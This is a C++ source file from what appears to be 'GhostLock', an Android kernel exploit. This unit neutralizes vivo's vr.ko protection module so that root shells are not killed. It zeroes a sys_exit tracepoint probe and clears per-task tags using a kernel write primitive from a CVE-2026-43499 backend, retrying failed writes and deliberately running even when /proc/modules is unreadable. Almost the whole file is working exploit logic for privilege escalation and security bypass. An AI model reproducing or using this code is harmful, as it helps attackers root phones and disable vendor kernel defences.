/*
 * GhostLock — vivo vr.ko neutralization, execution unit.
 *
 * The plan (which addresses, in which order) is header-only and host-tested in
 * vr_guard.hpp; this unit owns everything that touches the device: the runtime
 * applicability probe, the retries and the writes.
 */

#include "session/ancillary/vr_guard.hpp"

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_policy.hpp"
#include "session/backend/cve_2026_43499_backend.hpp"
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"

#include <array>
#include <cstdint>
#include <cstdio>
#include <string_view>
#include <unistd.h>

namespace ghostlock::session::ancillary {
    namespace {
        constexpr uint32_t kProbeAttempts = 5;
        constexpr useconds_t kProbeBackoffUsec = 50000;

        /* Runtime applicability (guide section 5). The profile gate only says
         * "this kernel has vr.ko"; the same GKI release ships from several
         * vendors, so confirm the module is loaded before spending writes on it.
         *
         * An unreadable /proc/modules counts as PRESENT, not absent: SELinux
         * normally hides /proc/modules from an unprivileged app, so "cannot
         * read" says nothing about the module and would silently disable the
         * bypass on exactly the devices that need it. The profile gate plus a
         * non-zero off_vr_sys_exit_tp are what actually restrict this to a vivo
         * kernel. Deliberately not cached in a function-local static: mutable
         * global state is not allowed, and one small proc read per stage is
         * free. */
        bool vr_module_loaded() {
            FILE *modules = fopen("/proc/modules", "r");
            if (!modules) {
                return true;
            }
            auto close_modules = support::make_scope_exit(
                [modules]() noexcept { fclose(modules); });
            std::array<char, 256> line{};
            while (fgets(line.data(), static_cast<int32_t>(line.size()), modules)) {
                /* Case-insensitive "vr" prefix followed by the module-name
                 * separator, so "vrouter" or "vrf" do not match. */
                const std::string_view name(line.data());
                if (name.size() >= 3 &&
                    (name[0] == 'v' || name[0] == 'V') &&
                    (name[1] == 'r' || name[1] == 'R') &&
                    (name[2] == ' ' || name[2] == '_')) {
                    return true;
                }
            }
            return false;
        }

        template <class Middleware>
        Status write_zero(ExploitSession &session, const VrWrite &write) {
            const memory::WriteRequest request =
                    memory::WriteRequest::make(write.target,
                                               memory::WriteMode::Zero, 1);
            return backend::Cve2026_43499Policy::template attack_write<Middleware>(
                session, request, write.desc);
        }

        /* The probe write is retried: the global disarm happens once per run and
         * a missed write leaves every later root shell killable, so a transient
         * route failure is worth several attempts. */
        template <class Middleware>
        Status neutralize_probe(ExploitSession &session, const VrWrite &plan) {
            for (uint32_t attempt = 1; attempt <= kProbeAttempts; attempt++) {
                pr_info("vr global: disarming sys_exit probe, attempt %u/%u\n",
                        attempt, kProbeAttempts);
                if (write_zero<Middleware>(session, plan)) {
                    pr_success("vr.ko sys_exit probe neutralized (attempt %u)\n",
                               attempt);
                    return true;
                }
                pr_warning("vr global: attempt %u failed, retrying\n", attempt);
                usleep(kProbeBackoffUsec);
            }
            pr_warning("vr global: all %u attempts failed; root shells may be killed at exit\n",
                       kProbeAttempts);
            return false;
        }

        template <class Middleware>
        Status clear_tags(ExploitSession &session, const VrTagPlan &plan) {
            Status ok = write_zero<Middleware>(session, plan.flags);
            if (ok && plan.tag_b.has_value()) {
                ok = write_zero<Middleware>(session, *plan.tag_b);
            }
            if (ok) {
                pr_success("vr.ko per-task tags cleared\n");
            } else {
                pr_warning("vr.ko tag clear failed; child may be killed during W2 verify\n");
            }
            return ok;
        }
    } // namespace

    template <class Middleware>
    Status VrGuardPolicy::apply(AncillaryStage stage, ExploitSession &session,
                                AncillaryContext &context) {
        if (!context.write_available) {
            return true;
        }

        context.component_present = vr_module_loaded();
        if (!context.component_present) {
            pr_info("vr.ko not loaded; vr neutralization not applicable\n");
            return true;
        }

        const profile::vr_guard_layout layout = profile::g_vr_guard_layout;

        if (stage == AncillaryStage::PreSpawn) {
            const uint64_t tp_offset = session.profile.off_vr_sys_exit_tp();
            const uintptr_t tp_addr =
                tp_offset ? session.addresses.data_alias(kernel::KIMAGE_TEXT_BASE +
                                                        tp_offset)
                          : 0;
            const std::optional<VrWrite> plan =
                vr_plan_probe(layout.funcs_offset, tp_addr);
            if (!plan.has_value()) {
                /* Name the field that is actually missing: the plan needs both a
                 * resolved __tracepoint_sys_exit symbol and the tracepoint
                 * layout, and they come from different sections. */
                const bool no_layout = !layout.funcs_offset.has_value();
                const bool no_symbol = tp_offset == 0;
                if (no_layout && no_symbol) {
                    pr_warning("vr global: vr_guard.funcs_offset and "
                               "offset.off_vr_sys_exit_tp are both unset; the "
                               "sys_exit probe stays armed\n");
                } else if (no_layout) {
                    pr_warning("vr global: vr_guard.funcs_offset is unset; the "
                               "sys_exit probe stays armed\n");
                } else {
                    pr_warning("vr global: offset.off_vr_sys_exit_tp is unset; "
                               "the sys_exit probe stays armed\n");
                }
                return false;
            }
            pr_info("vr global: tp=0x%016zx funcs_offset=0x%x -> zeroing 0x%016zx\n",
                    tp_addr, layout.funcs_offset.value_or(0), plan->target);
            return neutralize_probe<Middleware>(session, *plan);
        }

        if (stage == AncillaryStage::PostSpawn) {
            if (!context.child_task) {
                pr_warning("vr post-spawn: no child task to clear\n");
                return false;
            }
            return clear_tags<Middleware>(
                session, vr_plan_tags(layout.tag_b_off, context.child_task));
        }

        return true;
    }

    /* Explicit instantiations for the catalogued middleware policies, mirroring
     * the backend: the write primitive is middleware-specific, so each catalogued
     * middleware gets its own code. */
    template Status VrGuardPolicy::apply<route::SelectPolicy>(
        AncillaryStage, ExploitSession &, AncillaryContext &);
    template Status VrGuardPolicy::apply<route::TcpPolicy>(
        AncillaryStage, ExploitSession &, AncillaryContext &);
    template Status VrGuardPolicy::apply<route::MulticastPolicy>(
        AncillaryStage, ExploitSession &, AncillaryContext &);
    template Status VrGuardPolicy::apply<route::FdGraphPolicy>(
        AncillaryStage, ExploitSession &, AncillaryContext &);
} // namespace ghostlock::session::ancillary